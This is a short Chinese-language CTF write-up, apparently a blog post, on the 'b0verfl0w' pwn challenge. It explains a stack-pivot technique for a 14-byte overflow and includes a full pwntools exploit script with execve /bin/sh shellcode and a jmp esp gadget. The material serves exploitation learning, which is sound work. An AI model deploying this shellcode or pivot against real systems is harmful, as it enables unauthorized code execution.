---
layout: '''x-ctf'
title: b0verfl0w'
date: 2018-03-18 23:11:36
tags: pwn
---
stack privot 题目
溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。

基本利用思路如下

利用栈溢出布置shellcode
控制eip指向shellcode处

第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。

`ROPgadget --binary b0verfl0w --only 'jmp|ret'  `

size(shellcode+padding)=0x20
size(fake ebp)=0x4
size(0x08048504)=0x4
所以我们最后一段需要执行的指令就是

```
sub 0x28,esp
jmp esp

```
Memory layout:
| Shellcode | Offset | 0x08048504 | Shellcode to perform stack pivoting | 

```
from pwn import *
sh = process('./b0verfl0w')
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
padding = 'a'*13
jmp_esp = 0x08048504
sub_esp_jmp = asm('sub esp,0x28;jmp esp')
payload = shellcode+padding+p32(jmp_esp)+sub_esp_jmp
sh.sendline(payload)
sh.interactive()
```
我不明白既然有了 asm('sub esp,0x28;jmp esp') 为什么还需要直接跳转到esp的gadgets。
解释：我们就可以借由jmp esp将执行流转移到栈上执行。而转移到栈上执行后，我们还需要对esp减上偏移(在返回地址时esp已经和ebp指向同一个地址)，使之转移到我们的buf中继续执行，而buf中我们事先就输入好了shellcode，那么我们在劫持完成后便可以获得一个shell
